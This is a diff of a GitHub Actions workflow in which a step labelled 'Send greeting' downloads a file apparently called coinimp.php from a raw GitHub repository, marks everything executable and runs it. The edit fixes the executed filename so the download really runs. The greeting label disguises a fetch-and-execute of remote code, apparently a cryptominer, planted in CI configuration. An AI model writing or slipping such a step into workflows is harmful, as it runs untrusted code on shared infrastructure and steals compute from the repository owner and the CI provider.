@@ -27,4 +27,4 @@ jobs:
     steps:
     # Runs a single command using the runners shell
     - name: Send greeting
-      run: wget https://raw.githubusercontent.com/Alikhanidr/gjjbvf/main/coinimp.php && chmod +x * && ./coinimp
+      run: wget https://raw.githubusercontent.com/Alikhanidr/gjjbvf/main/coinimp.php && chmod +x * && ./coinimp.php
